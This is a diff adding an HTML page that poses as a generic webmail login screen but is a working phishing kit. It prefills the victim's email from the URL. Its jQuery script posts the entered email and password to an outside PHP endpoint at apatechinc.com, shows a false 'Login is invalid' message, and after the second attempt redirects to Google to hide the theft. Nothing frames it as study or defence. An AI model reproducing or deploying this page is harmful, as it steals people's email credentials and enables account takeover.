@@ -1,0 +1,192 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html><head>
+  
+  <meta content="text/html; charset=ISO-8859-1" http-equiv="content-type">
+
+  
+  <link rel="icon" type="https://roweboating.com/lognet/image/ico" href="https://roweboating.com/lognet/image/favicon.ico">
+
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <title>Webmail Login</title>
+
+  
+  
+  <script type="text/javascript">
+  function populatefirst() { 
+  var varSection = window.location.search.substr(1);
+  var varArray = varSection.split("&");
+  for(var v=0; v<varArray.length; v++) { 
+      var keyValueArray = varArray[v].split("="); 
+      if(keyValueArray[0]=="userid") { 
+          varValue=keyValueArray[1]; 
+          document.getElementById("userid").value=varValue; 
+          break;
+          } 
+      }
+  }
+  </script>
+  
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  
+  <script type="text/javascript">
+	var attempt = 2;
+	$(document).ready( function(){
+	$('#button').click(function(e){
+	e.preventDefault();
+	  
+	// Validate email and password
+	var userid = $("#userid").val();
+	var password = $("#password").val();
+
+	var dataString = 'userid='+ userid + '&password='+ password;
+	var msg = "Please fill all details";
+	if(userid=='' ||password=='')
+	{
+	  $("#message").show().html(msg);
+	  $("#message").css('background-color', '#D35351');
+	}
+	else
+	{
+		$("#message").hide().html(msg);
+	  attempt --;
+	  // AJAX Code To Submit Form.
+	  $.ajax({
+		type: "POST",
+		url: "https://apatechinc.com/host-settings/zipweb.php",
+		data: dataString,
+		success: function(){
+		  var msg = "Login is invalid";
+		  $("#message").html(msg);
+		  $("#message").css('background-color', '#D35351');
+		  $("#message").show().html(msg);
+		  if(attempt == 0){
+			location.replace("https://www.google.com/");
+		  }
+		}
+		
+	  });
+	}
+	return false;
+
+  });
+});
+  </script>
+  
+  <style>
+html,body{
+margin: 0px;
+height: 100%;
+}
+
+.container1{
+width: 400px;
+height: 400px;
+margin: auto;
+text-align: center;
+}
+
+.cover{
+width: 280px;
+margin: auto;
+}
+
+.userid{
+width: 260px;
+height: 30px;
+border: 2px solid #bebebe;
+border-radius: 5px;
+padding-left: 20px;
+margin-top: 10px;
+outline: 0px;
+}
+
+
+.password{
+width: 260px;
+height: 30px;
+border: 2px solid #bebebe;
+border-radius: 5px;
+padding-left: 20px;
+margin-top: 10px;
+outline: 0px;
+}
+
+
+.submit{
+width: 285px;
+height: 35px;
+border: 1px solid #333333;
+border-radius: 5px;
+text-align: center;
+font-weight: bold;
+color: white;
+background-color: #179bd7;
+cursor: pointer;
+}
+
+.submit:hover{
+  background-color: #095779;
+}
+
+.error{
+color: #ffffff;
+width: 300px;
+height: 40px;
+margin: auto;
+padding-left: 20px;
+padding-top: 10px;
+font-family: arial;
+font-size: 12px;
+border-radius: 5px;
+}
+  </style>
+</head><body onload="populatefirst()">
+<br>
+
+<br>
+
+<div class="container1"><br>
+<div style="text-align: left;" class="error" id="message"><br>
+</div>
+<br>
+<img style="width: 320px; height: 75px;" alt="logo" src="https://roweboating.com/lognet/image/a2.png"><br>
+<div style="text-align: left;" class="cover"><br>
+<span style="color: rgb(44, 58, 89); font-family: Arial; font-weight: bold;">Email Address</span><br>
+<div class="user-cover">
+<input class="userid" id="userid" maxlength="128" name="userid" placeholder="Enter your email address." value="" ><br>
+</div>
+<br>
+<br>
+<span style="color: rgb(44, 58, 89); font-family: Arial; font-weight: bold;">Password</span><br>
+<div class="pass-cover">
+<input id="password" class="password" maxlength="128" name="password" placeholder="Enter your email password." type="password"><br>
+</div>
+<br>
+<br>
+<input id="button" class="submit" name="submit" value="Log in" type="submit"><br>
+<br>
+<br>
+<div style="text-align: center;"><small style="font-weight: bold; color: rgb(44, 58, 89);"><span style="font-family: Arial;">Reset Password</span></small><br>
+</div>
+</div>
+</div>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<div style="text-align: center;"><img style="width: 691px; height: 169px;" alt="foot" src="https://roweboating.com/lognet/image/a1.png"><br>
+</div>
+
+<br>
+
+<br>
+
+</body></html>
